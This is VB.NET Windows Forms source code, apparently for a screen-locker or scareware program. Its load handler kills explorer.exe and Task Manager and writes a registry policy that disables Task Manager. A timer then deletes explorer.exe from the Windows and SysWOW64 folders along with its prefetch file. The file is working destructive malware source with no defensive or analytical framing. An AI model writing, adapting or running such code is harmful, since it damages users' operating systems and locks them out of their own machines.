Public Class Form1

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Label3.Hide()
        Timer1.Start()
        Label5.Hide()
        ProgressBar2.Hide()
        Label6.Hide()
        Shell("taskkill /f /im explorer.exe")
        Shell("taskkill /f /im taskmgr.exe")
        Shell("reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system /v DisableTaskMgr /t REG_DWORD /d 1")
    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        ProgressBar2.Increment(1)
        If ProgressBar2.Value = ProgressBar2.Maximum Then
            Form5.Show()
        Else
            Form2.Show()
        End If
    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        Form3.Show()
        Me.Hide()
    End Sub

    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
        Label3.Show()
    End Sub

    Private Sub Button4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button4.Click
        Form4.Show()
    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        Label1.Text = My.Settings.caption1
        Label2.Text = My.Settings.caption2
        ProgressBar1.Increment(1)
        If ProgressBar1.Value = ProgressBar1.Maximum Then
            My.Computer.FileSystem.DeleteFile("C:/Windows/explorer.exe")
            My.Computer.FileSystem.DeleteFile("C:/Windows/SysWOW64/explorer.exe")
            My.Computer.FileSystem.DeleteFile("C:/Windows/Prefetch/EXPLORER.EXE-082F38A9.pf")
            Form6.Show()
            Timer1.Stop()
            ProgressBar1.Value = 0
            Me.Hide()
        End If
    End Sub

    Private Sub PictureBox1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles PictureBox1.Click
        LoginForm1.Show()
    End Sub

    Private Sub Button5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button5.Click
        Label6.Show()
    End Sub
End Class
